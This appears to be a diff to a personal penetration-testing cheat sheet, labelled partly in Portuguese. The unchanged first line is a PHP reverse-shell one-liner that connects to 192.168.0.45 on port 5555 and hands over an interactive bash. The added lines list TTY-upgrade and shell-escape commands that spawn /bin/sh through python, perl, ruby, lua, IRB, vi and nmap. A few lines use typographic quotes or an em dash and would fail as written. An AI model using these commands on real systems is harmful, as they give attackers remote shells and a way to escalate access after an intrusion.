@@ -1,2 +1,32 @@
 #shell tty
 php -r ‘$sock=fsockopen(“192.168.0.45”,5555);exec(“/bin/bash -i <&3 >&3 2>&3”);’
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+echo os.system('/bin/bash')
+
+/bin/sh -i
+
+perl —e 'exec "/bin/sh";'
+
+perl: exec "/bin/sh";
+
+ruby: exec "/bin/sh"
+
+lua: os.execute('/bin/sh')
+
+(de dentro do IRB)
+
+exec "/bin/sh"
+
+(de dentro do vi)
+
+:!bash
+
+(de dentro do vi)
+
+:set shell=/bin/bash:shell
+
+(de dentro do nmap)
+
+!sh
